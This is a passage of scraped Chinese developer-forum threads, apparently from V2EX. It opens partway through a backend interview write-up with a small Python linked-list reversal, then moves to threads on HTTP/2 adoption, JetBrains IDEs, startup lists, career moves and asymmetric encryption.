），然后又带我把一面所有问题过了一遍，我不清楚的地方都完整的给出了答案，没见过这么好的面试官！！不知道他们给我多少分，我给他们满分！</p>\n<h2>二面</h2>\n<p>二面面试官是头条广告后台组主管，对我的创业经历很感兴趣，问了很多相关问题，然后看到我的开源项目又问了一些问题，然后提了一个很有意思的题目，在极端情况下，系统缓存全部失效，该如何防止流量全部打到数据库上，当时从很多方面考虑但是感觉面试官没有非常满意，不过也算是答到了点子上，也就算过了。回去后特意看了看，缓存失效的解决方案，感兴趣的同学自行搜索 “缓存重建”。</p>\n<p>然后问了问一些项目相关的经验和解决方案，出了一道单链表逆置的题目 （ 和面试官透露非科班，没有出很难的题目 ），然而当时大脑基本处于停转状态，太困了，最后写出来有个 bug ，其实题目很简单，回去稍微想了下就写了出来：</p>\n<pre><code>def revese(node):\n    p = node\n    cur = node.next\n    p.next = None\n    while cur:\n        tmp = cur.next\n        cur.next = p\n        p = cur\n        cur = tmp\n    return p\n</code></pre>\n<p>面试官表示 coding 能力需要加强，当时也不好说自己没睡觉，就直接说确实能力需要加强。面试关说让我等等去找下一轮面试官，等了一会儿告诉我下个面试官不在，当时觉得我是挂了 （ 结果是面试官真的不在 ），面试官好像看出了我的想法，重复了一句面试官真的不在。让我回去，稍后 hr 约下次面试时间。</p>\n<h2>三面</h2>\n<p>三面是一周后的下午 6 点，这次终于来到了面试室，里面有一块白版，三面面试官是广告大组的 leader ，进来没有再考基础题，问过经历后出了五道系统设计题，于是开始在白板上写，大概记得有多端登录管理、二维码登录等等一些设计，要求设计出系统结构，相关数据库和表，博主设计完后给面试官讲了一遍，感觉面试官比较满意，也没再问其他的，直接去叫下一轮面试官了。</p>\n<h2>四面</h2>\n<p>四面面试官是头条 data 部门的 vp ，感觉人超级和善，进来直接跟我说一起去吃饭吧，刚好体验下头条食堂，然后，第四轮面试是在饭桌上进行的，主要谈了谈我的项目经验和发展方向以及为何来头条，最后吃完饭面试官说本来这一轮也会考技术，但是感觉聊得不错，就不聊技术了，让我回去等 hr 电话。（ 头条食堂真的不错呀，只是当时没好意思多打，哈哈 ）</p>\n<h2>五面</h2>\n<p>hr 电话聊了聊个人发展及规划，然后确定了薪资，就发了 offer ~~</p>\n<p>头条环境非常不错，包三餐，自助食堂，无限水果零食还有下午茶，晚上 10 点后打车报销，入职发 mac ， 住公司周围房补，大小周加班有加班费等等，总之福利非常多 （ 为何我知道的这么多 ）还是推荐大家来哦。</p>\n<h1>总结</h1>\n<p>最后，博主选择了头条的 offer 。（ 已经找到当初面试我的大神们，哈哈，开心 ）</p>\n<p>从去年底找工作找到今年节后，终于找到一个满意的 offer ，曾经也纠结过，感觉自己高不成低不就，有段时间甚至拒绝出去找工作。</p>\n<p>很多大公司社招都是三年经验起，所以像博主这种毕业一年的人在没有内推的情况下参加社招非常尴尬，在这里奉劝各位学弟学妹，一定要抓住校招的机会啊！！社招跟你竞争的可不光是你们同级的人。</p>\n<p>找到工作后偶然发现一本神书 《剑指 offer 》我面试过基本所有问题上面都有，推荐大家一定过一遍（ 要是早点看到就好了，哈哈 ）</p>\n<p>这里还有博主当时刷过的 <a href=\"https://github.com/bluedazzle/leetcode_python\" rel=\"nofollow\">LeetCode</a> <a href=\"https://github.com/bluedazzle/leetcode_python\" rel=\"nofollow\">https://github.com/bluedazzle/leetcode_python</a> ，可以参考一下，之后有时间博主也打算一直刷下去。</p>\n<p>平时一定要注意多积累，有条件的情况下尽量自己多写一些自己的项目，这样面试会有很大的加分，比如博主之前写过的小程序：<a href=\"https://www.rapospectre.com/blog/create-an-onmyoji-weapp-in-24-hours\" rel=\"nofollow\">式神猎手</a> ( <a href=\"https://www.rapospectre.com/blog/create-an-onmyoji-weapp-in-24-hours\" rel=\"nofollow\">https://www.rapospectre.com/blog/create-an-onmyoji-weapp-in-24-hours</a> ) 在面试中就很有益处。</p>\n<h1>还没完</h1>\n<p>说到抓住校招，今日头条春招刚刚开始，学弟学妹抓紧机会，本人可以内推哦：</p>\n<p>今日头条春季校园招聘火热进行中！\n[面向对象] ： 2017 年应届毕业生和 2018 年应届暑期实习生\n[职位方向] ：研发、产品、运营、销售、投资、 HR 等\n[春季招聘 - 2017 届] ： <a href=\"https://job.toutiao.com/campus/spring\" rel=\"nofollow\">https://job.toutiao.com/campus/spring</a>\n[暑期实习 - 2018 届] ： <a href=\"https://job.toutiao.com/campus/summer\" rel=\"nofollow\">https://job.toutiao.com/campus/summer</a>\n[投递时间] ： 3 月 9 日 - 4 月 30 日\n[头条邀请码] ： iUGUiF （不区分大小写）</p>\n<p>登录相关网址输入我的头条邀请码即可成功内推哟，快到碗里来！！</p>\n<p>社招的同学也别灰心，只要你找得到我的邮箱（ 应该挺好找的 ），简历发给我，帮你内推~</p>\n<p>当然，对于以上其他家公司，只要我拿到 offer 的公司我都可以帮大家推哟。</p>\n<p>面试过程中还去过几家创业公司聊过，发展也很好，比如 青橙科技、视频帮等等，如果大家感兴趣，我都可以帮大家直推 CTO 。</p>\n<p><a href=\"https://www.rapospectre.com/blog/2017-backend-interview-share\" rel=\"nofollow\">原文地址</a> <a href=\"https://www.rapospectre.com/blog/2017-backend-interview-share\" rel=\"nofollow\">https://www.rapospectre.com/blog/2017-backend-interview-share</a></p>\n<p>作者：<a href=\"https://www.rapospectre.com/\" rel=\"nofollow\">rapospectre</a></p>\n</div></div>", "<div class=\"topic_content\">fib 数列那里是常数空间复杂度哈，文中写错了。 感谢 @<a target=\"_blank\" href=\"/member/razrlele\">razrlele</a> 指正</div>"], "reply": "167", "tittle": "2017 后端面试经历分享", "comment": [" 客气啦", " 应该是遇到了要求比较高的 hr ，再试试呢？", " 大公司问的比较多，创业公司主要看你的开发经验。平时的话多做做项目，能积累下来一些经验的", "给的 github 上的 leetcode 的题数不多呀，楼主难道都是刷 hard ？", " 感谢，不过大家能懂我的意思就好啦，反正音译的嘛，哈哈哈", " 因为没刷很多，那段时间边找工作边在原公司写业务。时间不多哈", "和贴主经历精人的相似，甚至可能面试官都完全相同，以至于你从阿凡题学堂在线果壳这几位面试官我脑海中都能回忆起音容笑貌，果壳的以空间换时间那题目似乎答案是用一个双栈解决吧。", "看完楼主感觉我两年多的工作经验都喂了狗，海投都没几个面试机会，一个悲伤的故事", "给校友顶一下", "人比人气死人啊", " 哇塞，这么巧，那一定要认识一下。是的， 双栈。", " 简历挺重要的，看看有什么问题，优化下自己的简历吶~", " 谢谢校友~", " 言重了大兄弟，我是渣渣，跟大神比差远了", "不错！楼主厉害！赞👍", " #111 可以可以，说真的看前面恍惚间竟然以为是自己写的，实在是太相似了，身临其境，大胸弟给你 Gmail 扔个了字符串过来，认识一下。", "科大校友啊！", " 目前正在一创业公司开发一个还比较大点的项目，目前准备边工作边学 Golang", "头条是大小周工作制哦？", "大神好厉害，虽然我是个前端，不懂你们后端的，但是觉得你好厉害啊", " 谢谢～", " 哈哈，校友好", " 那不错啊，加油～我觉得你还是挺有潜力的", " 是的，不过周末加班给加班费", " 没有那么厉害啦，互相学习互相学习", "据说 360 面试 体验好不错，感觉也不至于这么坑吧，不过那公司确实发展不怎么样", " 我那个应该是个例，就当故事乐乐吧～", "赞一个 希望这样的帖子多一点", "果壳的那题算法题应该是 leetcode 上： ", "\r", "顺便贴下我的解法： ", "写了这么长，可以可以", "蛮后悔当初没去楼主学校……", "哎，难得有人分享社招的面试经历，顶一个。", "求教下，题主，都看了哪些书？", "羡慕楼主在北京可以有这么多用 python 的公司可以选，我在深圳简历都没地方投。。。", " 加油~", "膜拜", " 多谢楼主回复", "果壳网的招聘流程稀烂\r", "\r", "两年前去过一次，现在还是这么烂", "“一面面试官应该是个后端研发工程师，感觉有些羞涩，全程一直不看我”\r", "画面感", " 谢谢支持", " 嗯嗯， 是的，棒", " 谢谢支持", " 没事，有更多更好的学校在等你", " 谢谢啦", " 书籍的话自己有兴趣的就会看吧， http 协议 ，高性能服务器之类的，提升自己的代码能力主要还是自己多写，多看别人的，多看知名项目的源码，提升会比较大。", " 深圳互联网金融公司很多啊，都是招 Python ，可以去看看呀", " 过奖啦", " 看来果壳流程是真的烂，好几个人吐槽了", " 哈哈，是的", "厉害，居然把每次面试都记得这么清楚。", " 都毕业好多年了……", "不容易", "看完楼主的分享，我感觉我已经废了", "LZ 刚毕业很厉害，刷 leetcode 对于面试头条和外企等很有用。", "楼主 666", "我电的校友，顶一个", " 大兄弟，对 Python 3 支持已经做好了，你试试呢？有问题随时提 issue 哈。\r", "\r", "pip install django-simple-serializer \r", "\r", "如果安装过：\r", "\r", "pip install django-simple-serializer --upgrade", " \r", " \r", "  谢谢大兄弟们的支持！", " 大公司都有些用的", " 太感谢了！", "哇！厉害了！\r", "求大腿！！！", "专程前来膜一发荡荡", " 哪有大腿，我也是渣渣，头条大神太多😂", " 见笑了我的崔😂", "以前见过，其实那个单个栈也可以，把当时栈的最小值减元素值，最小值轨迹是负，其他正，只需要额外一个变量存当时栈最小值", "来来回回看了好几遍，有很有参考价值，多谢楼主", "这几家公司的例子很棒，很有参考价值。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>生产环境有已经上 http2 的么？</p>\n<p>如题～</p>\n</div></div>"], "reply": "31", "tittle": "生产环境有已经上 http2 的么？", "comment": ["又拍云算吗？", "这都是标配了 好吗", "this", "Google 算嘛😏", "Qzone 目前已经全上 H2 了", "我经手的都上 h2 了", "windows server 2016 iis 默认 http2 ，所以可以认为微软已经用于生产环境了。", "我们的产品从去年就全线支持了 HTTP/2", "换行。\r", "\r", "\r", "\r", "\r", "换行。", "http2+tls1.3+CDN 有助于移动互联网产品极大的改善用户的连接体验。", "楼主不好意思，按错了。请无视楼上。", "淘宝，百度早用上了", "淘宝，百度，腾讯早就是 http2 了", "过年前配好了", " 只是上了 https ，并没有上 http2", "刚才就给我的个人站点上 HTTP2 了。", "我用了 gRPC ，就当我用了吧。", "Google 早就大规模用了，不行你看首页", " grpc 用起来咋样，会有什么问题不", "看你一說才發現 alpine 的 nginx 1.10 已經默認編譯 http2 了. 謝謝提醒. 明天升個級.", "上和用是两个概念。一大片群众在 ie8 。", "首先， IE11 才开始部分支持 HTTP/2 ， Chrome 也是从 41 才开始支持。。。", "个人博客上了 HTTP/2 ， ", "HTTP/2 有啥神秘的吗？相对应用的各种性能问题， HTTP/100 都无所谓。", " 多路复用", " 我也是, 上了 grpc 的船", "本站就是 HTTP2 ，好多大公司的网站都是 HTTP2 了，哈哈，我自己的博客都上了。", " @", " 你们怎么解决分布式事务问题的？", " 你自己好好看看\r", "\r", "\r", "\r", "虎扑", "忍不住来顶下帖，顺带告诉大家：又拍云 CDN 在 HTTPS 协议的基础上已实现全平台支持 HTTP/2 。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>IDEA 只有一点小版本升级才能自动下载更新，大版本基本上就是自己去官网下载完整包</p>\n<p>Pycharm 这些，大版本也能自动下载更新</p>\n<p>感觉更新的功能好像是不同的组做的</p>\n</div></div>"], "reply": "11", "tittle": "没有人注意到，每次 IDEA 升级和 pycharm 等不一样吗", "comment": ["感觉是有些小版本升级，升级的内容就是打个 patch ， 更新某个 jar 包，所以就直接替换了\r", "大版本可能就是需要更新核心组件了", "管它的呢，无脑上 jetbrain 全家桶，以前的 IDE 都弱暴了。", "用 JetBrains Toolbox App 之后就再也不用去官网下载了。", "楼主 用 JetBrains Toolbox App", "我在 mac 上用 JetBrains Toolbox App   好像也没作用  登录以后  也不能升级  也是要下载单独安装包", "表示我用 PyCharm 大版本更新从没见过直接 Patch 的，有时候小版本都是重新下载。。。。", "Jetbrains Toolbox App +1", "前几天 mac 更新 Pycharm 也是不能 patch", "JetBrains Toolbox App +1\r", "还能帮助管理 project 要不每次还得想哪个 project 用全家桶里哪个应用开", "升级了 2017 感觉不好用了", " 2016 升级 2017 就是打补丁包升级啊"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>我接触之后觉得不错的:\n上海： strikingly,即刻,agora.</p>\n</div></div>", "<div class=\"topic_content\">统计了一下同学们的回答:\r<br>上海: strikingly, 即刻,agora,饿了么,微鲸科技,学霸君, teambition, 裸心社, 波罗蜜\r<br>北京: 猿题库, 长亭科技, Worktile\r<br>\r<br>深圳: Ucloud 分部 \r<br>南京: 扇贝</div>", "<div class=\"topic_content\">最新列表:\r<br>上海: strikingly, 即刻,agora,饿了么,微鲸科技,学霸君, teambition, 裸心社, 波罗蜜 \r<br>北京: 猿题库, 长亭科技, Worktile \r<br>杭州：微店，有赞，蘑菇街\r<br>深圳: Ucloud 分部 ,极光，友好速搭\r<br>南京: 扇贝</div>"], "reply": "32", "tittle": "要不我们一起来统计一下北京上海杭州深圳的靠谱的创业公司吧", "comment": ["两个月后再看，倒闭了一半", "北京：猿题库", "北京：长亭科技", "深圳： Ucloud 分部\r", "\r", "北京： Worktile", "有没有统计济南的", "广州：喵喵喵？？？", "有南京的么", "广州互联网企业本来就少 优秀的创业公司就更少了", " 不太多", " 我列举的几个，应该不会。", "创业公司 !== 靠谱", " 感觉南京扇贝不错， Python 的。", "支付宝  菜鸟物流也是创业公司 2333", "上海饿了么也不错啊。。。毕竟现在就在饿了么", "上海：微鲸科技，学霸君， teambition ，裸心社，波罗蜜", " 山东没有能去的吧……有的话就回去了", " 兄弟刚跳到的饿了么？", "怎么定义靠谱啊", " 哈哈哈哈，加工资", " 对的，咋啦", "深圳：极光，友好速搭", "不如在 github 搞一个 repo ？", "不是很懂为什么要统计这个。\r", "\r", "潮起潮落，这个列表会持续更新吗？\r", "\r", "可以避免被广告占据吗？", "不觉得会有 hr 吗", "乐视算不算？", " 有 hr 也没有什么关系吧", "如何定义靠谱？", " 那这数据没任何价值哪。", " 我觉得价值在，当你想找一个初创公司机会的时候有一个简单的列表可以参考。", "杭州：微店，有赞，蘑菇街", "标题不是`北京上海杭州深圳`吗 杭州去哪了。。。。", " 后面整理一下"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><img alt=\"\" src=\"https://raw.githubusercontent.com/aleen42/https-resources/master/kaspersky_earth.jpg\"></p>\n<p><a href=\"https://2050.earth\" rel=\"nofollow\">https://2050.earth</a></p>\n<p>说英文可能你们都不太清楚，但若是说这就是卡巴斯基实验室，也许大家都知道：哦，原来是那一年我们都用的杀毒软件。= =</p>\n<p>昨天在 <a href=\"http://www.thefwa.com/\" rel=\"nofollow\">FWA</a> 上偶遇到 Kapersy Lab 所做的这个东东，一看上去就知道是最近很流行的 three.js 所做的特效，因为感觉很 ingress ，所以在此分享给各位大大。</p>\n</div></div>"], "reply": "目前尚无回", "tittle": "Kaspersky Lab 所做的创意东西？", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>说实在的，身为一个程序员，很难理解为啥会有这样的人，这样的想法和逻辑：</p>\n<p><img alt=\"\" src=\"//i.imgur.com/urzceVI.png\"></p>\n<p>laravist 社区里面的一些评论。。。。</p>\n<h2>所以什么才是开源精神</h2>\n</div></div>"], "reply": "110", "tittle": "laravel 都是开源的 录个视频也要收费 一点开源精神都没有", "comment": ["1 楼结帖。这个逻辑问题早就被解释完了……", " #101 咦我竟然翻页了？", "其实我就想知道，这个大家支持视频收费，为啥却对 ThinkPHP 教程电子书收费耿耿于怀？\r", "\r", "他们的基础文档是免费的，教程是收费的。\r", "\r", "虽然我现在很少用 ThinkPHP 了，但是我还是去买了电子书，那么点小钱，纯当支持。", "自己劳动付出，收费合理", "open not free", "开源！=免费", "lz 这标题的鱼钓的。。", "刚刚看了楼主的网站，感觉楼主为此付出了大笔时间，而且很投入，回答问题也很有耐心。\r", "我们既然购买了服务，享受到了便利，也应该维护作者的权益！", "楼主应该只是来给自己的网站做宣传的", " 放心，我做广告的时候会说明且大大方方"]},
{"content": ["<div class=\"topic_content\">标题栏就显示文件名和项目名，占一行有点浪费。比方说能不能弄成这样（PS图）\r<br>\r<br><a target=\"_blank\" href=\"http://i.imgur.com/rWRtJlD.png\"><img src=\"http://i.imgur.com/rWRtJlD.png\" class=\"embedded_image\"></a></div>"], "reply": "17", "tittle": "JetBrains 家的 IDE 能去掉 title bar 么..", "comment": ["可以吧,你这个把标签页那栏干掉就和我的一样了", " 你的系统是？\r", "\r", "还有个前提是不最大化、不全屏。", "看不到图", " imgur 你懂的", "全屏编辑吧", " 全屏有全屏的问题（窗口并排、切换等等）", "其实我也想把这个 title bar 去掉。。。", "你用 windows 就好了，没有标题栏你还不习惯呢", "mac 下..", "去不掉哦。除非全屏编辑。", "你说是那个 Breadcrumb 吧？还有右边的快捷按钮。都是可以自定义的，去 YouTube 搜教程。", "说出了我多年的想法。现在各大 ide 平台都在精简界面， jetbrains 也该表示一下啦", "面包屑是菜单 View -> Navigation Bar  \r", "觉得界面元素太多，可以 View -> Enter Distraction Free Mode", "你们的 JetBrains  的 cache 文件都有多大?", "View -> Enter Distrction Free Mode\r", "View -> Toggle Full Screen Mode\r", "可以完全全屏，整个页面只有代码区域，剩下的快捷键解决就可以了。 Alt + 1 工程目录， Alt + 5 调试窗口， Shift + F10 启动， Shift + F9 调试， Ctrl + F2 停止调试，可以一试。", "技术上，要 hack macOS 的窗口控件才能实现吧。\r", "Intellij 是用 java 实现的，虽然在 mac 版上有一些 wrapper ，但是要实现起来还是必要一些 hack 的， IDEA 肯定不愿意这么做吧", "不是开源的 就去官网论坛或者打客服电话"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>再过几天就离职了，我准备去一家毫无名气的初创公司工作了。</p>\n<p>说真的，当我决定辞去现有工作的时候，我真的犹豫和徘徊过，毕竟这份工作薪水还算可以然后工作内容我也可以轻松驾驭，一切都在自己的掌控之中。除了生活能够一眼望到头、职业生涯进展慢一些好像没有什么不好的地方。</p>\n</div></div>"], "reply": "87", "tittle": "我准备去一家毫无名气的初创公司工作了", "comment": ["你已经把一切能说的都说完了。。。", "你已经把一切能说的都说完了。。。", "你已经把一切能说的都说完了。。。", "你已经把一切能说的都说完了。。。", "然而新工作会有很多不好的地方……", "这次离职早在四月前和一个多年的老朋友吃饭就已经埋下了伏笔，这几年我跟那个朋友保持着半年一聚的习惯，吃饭就是聊聊最近有啥新想法，是不是有好的创业方向，各种毫无边际的聊天。\r", "\r", "这次我们聊到了内容付费方向，非常认真的聊了得到，小密圈，知乎 live ，分答，值乎， medium 等等产品，不知道是心血来潮还是什么，我说我想投身到这场内容付费的大潮中去......", " 作为大弓的开发者，我觉得你现在还来得及再考虑一下……", "楼主想要是鼓励：去吧，楼主，早日升职加薪，走上人生赢家", " 连在微信火了一把的大弓开发者都这么说了，但是感觉我自己后悔已经来不及了", "然后就是这次吃饭，朋友决定说给我投资我不到两百万的天使投资权当作赞助我创业了，我就成了这家毫无名气的创业公司的 CEO 。\r", "\r", "在之前参与过一次失败创业的我，拿到天使之后其实并没有像第一次那样兴奋，因为创业真真是九死一生，对创始人和创始团队要求也非常高，即便这样依旧有巨大的风险。而我并没有多牛逼，也还没有组建到多牛的团队。\r", "\r", "像那个笑话一样，我也开始发帖说我差个程序员了。", "创业九死一生，但不创业，会让人感觉百生不如一死。支持你，加油！", "加油，有投资就好", "原来是当 ceo 。。\r", "还是城市套路深啊。。", "创造工作岗位了", "原本还想安慰安慰你 没想到是去当 CEO 你还是安慰安慰我吧\r", "\r", "哈哈 玩笑开到这 祝老哥一帆风顺 前程似锦", "不是应该发到招聘节点？ [手动滑稽] ", "谈情怀没啥用的，程序员归根到底只是个打工的，公司再发展他一样只是拿年薪。\r", "所以要想招人就开高工资吧，假如没钱别人跟你奋斗图什么？", "对标 BAT  别谈股权 还可以好好招人 哈哈哈", "原来是 CEO, 还以为是程序员呢", " 我这次创业自己也想的很清楚，找不到大牛那就找聪明经验少的同学，我愿意每月付费邀请大牛来做技术分享培训，而且薪资我也愿意给业界的水平。", "so 搞了半天是招聘贴？", "原来是 CEO, 还以为是程序员呢", "靠，套路真深，原来是招聘贴", "老哥稳  加油", "200W 最多烧一年吧，然后怎么办？", "加油！", "城市套路深。", "200 万，如果在北京，烧不到 1 年", "666", "最近创业公司倒闭 N 多 资本市场已经没那么活跃了. \r", "不是讲个 PPT 就能拿到钱的时候了.\r", "感觉以后能拿到融资相对比以前要难的多了.", "远程工作啊，好处多，办公场地便宜，不用给员工配电脑，有事就打电话沟通。员工也能免去上下班花的时间，每周都聚聚吃个饭聊聊天。", " 嗯啊，像我这种非知名非牛逼的创业者只能做点小的可以挣到钱的项目才行，不然肯定是死死死", "背景交代是不是有点少", "楼主我也跟你一模一样啊。。。刚辞职了也是犹豫了很久", "想做哪个领域的内容付费? 最近对这块兴趣挺大。", "做的是内容付费？\r", "内容为王，人脉、内容有了再说…\r", "程序员一抓一大把，别想着花少钱找个聪明、经验少的。即使付费请大牛分享技术，把人培养好了，但最终学成后经验涨、不涨工资，等于帮别人培养人才。", "老哥稳，刚八代", "建议找个初创团队吧。。。每个人给一些股份啥的。。。一个人不靠谱。。。。", "城里人真会玩", "才 200 万啊…… 你准备建个几人的团队呢？多招几个感觉发一年工资都不太够的样子啊……", "所以这个贴是来招人的。坐标哪儿？有具体方案么？", "我擦，认真看完了，城市套路深", "老实说，当前拿到 200W 天使，已经不错了", "其实不是看有多少投资，而是做得怎样，市场验证得怎样", "曾做过相关行业，回头是岸，哈哈哈～不过，还是祝老兄一帆风顺，能走下去～", "擦，原来是去做 CEO ，那就没得说啦", " 现在能拿 200W 不错了已经，还指望是几年前吹个 PPT 直接给 500W 的年代？省点钱，如果干得好足够撑到下一轮，干不好，多少钱也是白扯", "加油！", "可以把求职节点里面找不到工作的哥们儿都弄到你那里去 =。=", "创业公司养不起人，我建议 lz 考虑一下让我给你远程开发吧，大家都有好处~~~哇哈哈哈", "希望你能成功", "额。。半年一见的朋友，吃饭间就能给出 200 万，这种魄力我真想学学，能引荐么", " 我想的是五个人", " 哈哈哈，你说的很对，现在开发都是远程的", " 要一个愿打一个愿挨的才行，糊弄来的浪费彼此时间", "看帖子打算鼓励下楼主，看回复感觉我才是需要鼓励的那个 /(ㄒoㄒ)/~~", "典型的自我感动，去就去一家初创公司，偏要一再加上“毫无名气”几个字，是为了托显出一种义无反顾，慷慨就义的悲壮吗。\r", "\r", "不是每个决定都这么伟大，踏实做事就好，加油。", " 有啥好自我感动的，说真的现在类似我这样的创业，都不好意思宣扬的，不过论坛大家互相不认识了。本来是发在另外一个社区想看看是否有志同道合同学", "表示初创公司都不要，说太稚嫩了......http://jackzong.github.io/2017/03/27/2017-03-27-di-yi-ci-mian-shi/", "从一个坑跳到另外一个坑", " 来吧 ;)", "今天看到了知乎日报推送了个类似标题的文章。", "200w 起步的话 足够了。\r", "创业公司半年后如果没做起来，那也不用考虑以后了", "加油 逃离舒适圈", "200w ，看怎么用。如果你有大腿可以抱，只要出研发经费，那作为起步还是够的，如果独立自主要活下来，啥都要从这 200w 里面出，那绝对不够。另外自己作为 ceo ，出了多少钱，也很关键，钱不出大头，股权不拿大头，事情也成不了。", "楼主好歹有个想法，说不定能改变世界呢，不拼一把估计将来会后悔的", " 哈哈，机智，昨天不就有一个好高骛远的前端找工作吗", "不要去!不要去!不要去！", " \r", "\r", "虽然不是第一次创业, 不过这 200w 还是应该以交学费为主... 天使的钱, 蛮好... 投机者需要有点觉悟", "天使轮了，没毛病", "你们啊, too simple\r", "想当年我拿了 20w 的天使还干了 2 年\r", "\r", "挺好的, lz 加油", "创业公司的用人成本其实挺高的", " 一个人干么？还是怎么样呢？团队怎么搞的？", "坐标在哪儿", "去吧，加油！", "套路果然深，不过至今不知道楼主意图", "原来是招聘...", "创业公司呆过好几个，很多人不愿意去创业，一方面不稳定，一方面工作量比较大，有时候加班就平常事。但是万事不能一根子打死，**主要看创始人和创业的最初目标**。最好的情况是大家相处融洽，一起成为朋友，随着公司一起成长。创业公司无技术债务，个人发挥的空间比较大，没有大公司磨磨叽叽的条条框框，人比较自由。\r", "\r", "经过一些创业公司，我也理解创业不易。但一些创业公司应该远离，\r", "\r", "1. 没明确目标，三天两天的烧脑的结果，要求马上实现，导致项目根本没有机会实施计划表 /里程。\r", "2. 一开始就摆架子的创始人，只会动嘴，没任何执行能力，天天画饼，幻想着两三个月去改变一个行业。", "看公司氛围咋样。如果是人情味儿比较复杂的公司，天天打鸡血吹牛逼，我觉得这样对自己技术栈很不利。一来老板把你只当做一个编码机器，而不考虑你的职业发展和晋升通道；二来这种公司很累，完不成任务好像欠了人情债，这样早晚把自己身体搞完。如果是那种偏技术的初创公司那么就不一样了。会学到很多东西。但也是很累。", " 很好的总结和建议！！！", "另一个社区看到了相同的帖子", " 对了，就是我，看到你也是用 ruby 技术栈哈，期待交流，哈哈哈哈", "这种标题党最 jb 恶心了。", "可以投简历吗？", "付费，微信在做，其它人机会不多，张小龙本人态度不明朗\r", "内容定价是未解决的，其它是已知的\r", "设备阅读是未开发的，亚马逊不喜欢中国，也不是硅谷公司\r", "所以，做得好，能赚一桶，不好，浪费三年时间", " 你总结的很对", "最近聊了三个大牛，一个是创业过两次然后回到武汉的，比我大一岁，但是已经对创业失去了兴趣，原话是已经拖家带口了想要稳定一些养家；另外一个是听到初创创业公司就直接拒绝了不想多聊了，我想他可能被创业公司伤害过吧；还有一个是认识的一个朋友，也在创业的道路上苦苦挣扎着，他跟我说的一句话就是凭什么别人要跟着你干呢？这让我陷入了深深的思考，凭什么让别人跟我干呢？最近几天在思考这个问题之中。\r", "\r", "最近几天找创业小伙伴的一些想法，不知道对不对。\r", "1 、找合作伙伴找一起创业的合伙人员工都必须要开诚布公，风险都说好，至少能够认可项目和伙伴，工资股份期权全部说清楚落实好；\r", "2 、创业初期可能真的不需要那么优秀的大牛，但是时刻跟大牛们保持关系，如果产品火了自然能够吸引到一些大牛加入；\r", "3 、工作两年左右，有创业激情的小伙伴应该是我这种毫无背景且不知名创业者的最佳伙伴；\r", "\r", "如果有做 ruby ，且对我保持兴趣的童鞋也期待加微信交流。 jixiaohua888 ，注明“ ruby 开发”"]},
{"content": ["<div class=\"topic_content\">优点缺点，值不值得买。。。来聊聊。。。</div>"], "reply": "6", "tittle": "X1 Carbon 2017 已经开卖了，已经入手的来说说使用情况啊", "comment": ["带鱼屏，还是等可能被砍的 retro thinkpad.", "知乎上很多评测，图文并茂，可以去看看", " 没动静了，应该是被砍了。 thinkpad retro 应该不会出来了。或者再等上 5 年。", "不看好联想", "xps 新版啥时候出", " 2017 在 CES 上已经出了吧"]},
{"content": "", "reply": "30", "tittle": "上班时写代码和下班后自己没事折腾，哪一个更利于对技术的提升", "comment": ["当然是上班时写代码，上了生产才出问题你去填坑提升飞快\r", "但是有个前提是必须跟薪资匹配", "哪个痛苦哪个提升快，一般上班写代码比较痛苦", "下班后多看书更利于技术提升", "同时进行提升快", "有兴趣的提升最快", "如果上班做的有意义，那么提升巨大。资源多，还可能有人带。\r", "如果上班做的毫无意义，比如改个翻译， merge 一下代码，那么必须自己学，但不如上面的快。", "有思考有总结才有提升，不是因为你做了什么就有提升，而是你做的过程中创新，尝试，填坑这些才能有提升的。和事情是上班做的还是下班做的也无关", "又不是二选一问题，没必要非得比较，同时做了最好", "二选一的话是上班，因为 deadline 所以你不会烂尾，下班的 project 经常烂尾请相信我！！！", "工作，因为要上线所以考虑的更全面。", "工作，当需要明确且严格的时候更容易发现自己的不足，提高技术的深度。不过瞎折腾提高技术的宽度。", "上班折腾，晚上看情况看书", "哪里思考的多，思考的深入，哪里快", "上班光写业务逻辑，哪能学到什么。", "上班的时候做到随时对工作进行归纳总结，逐步优化\r", "下班要勤奋的嗐折腾\r", "我就是这么干的", " 我相信你[😂]", "上班深度\r", "下班广度\r", "放假瞎折腾", "自己折腾学得多。工作中用到的都是旧的知识。没有新鲜感。", "上班写代码下班看书学技术，再想办法用到工作里，通过上线的业务去锻炼新学的东西，不然自己做着玩，真是很难学到啥东西，除非自己花几个月半年搞个大项目。", " 能把业务逻辑说明白的已经很不错了，等上班就知道别说是写逻辑了，给你纸和笔，不用高大上的软件，能把业务逻辑讲清楚都很优秀了", "只要能乐在其中，都能提升，最好是下班看书学思想、塑思维，上班码代码验证。", "我觉得是，上班没事的时候自己折腾提升最快", "折腾 也得是有目的性的折腾\r", "找到自己不足边界 深入完善", "看情况，如果工作只是编写业务代码，那么业余时间对技术提升更快。", "上班是做深度，下班做广度，没问题", "把自己下班时间学到的运用到上班时写的项目中最有成就感！", "上班吧. 毕竟上班的时间多一些.\r", "下班事情就多了. 陪女朋友 出去聚会 看电影 打游戏 路上耽搁一些时间等等等等", " 说得好像我还没开始上班似的 lol", "开心提升最快", "走出舒适区才会提升。有时候一直对自己说要提升，但一直原地转圈，不愿走出既定技术舒适区，那么就没多大进展，虽然也觉得自己每天挺辛苦。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>最近看了点非对称加密的一些文章，</p>\n<p>产生了一些疑问，不知道有没有有缘人可以帮忙解答。</p>\n<p>如果要把这种加密加到聊天中去，我的想法是这样的：\n每个客户端生成一份公钥发送给服务端，服务端也生成一份给每个客端。</p>\n<p>这样应该就可以实现每条消息都只有两方可以查看，不过服务器需要维护一份用户和用户公钥的对应关系，在每次发送消息时取出来再对消息进行加密。</p>\n<p>有个不知道对不对的想法：</p>\n<p>如果像 https 一样用自己的私钥进行加密，客户端用服务端的公钥解开也能实现加密，不过这消息所有的客户端都能解开了，这样也不好。</p>\n<p>我的问题是：</p>\n<p>这种对于多客户端的加密，如何才能做到加密的且高效？</p>\n<p>找了一些资料，并没有找到答案，当然你也可以：\n<a href=\"http://dwz.cn/5EbYc7\" rel=\"nofollow\">http://dwz.cn/5EbYc7</a> （手动滑机）</p>\n</div></div>"], "reply": "26", "tittle": "关于非对称加密在实际中应用的一些疑问", "comment": ["非对称加密主要应用在秘钥协商阶段\r", 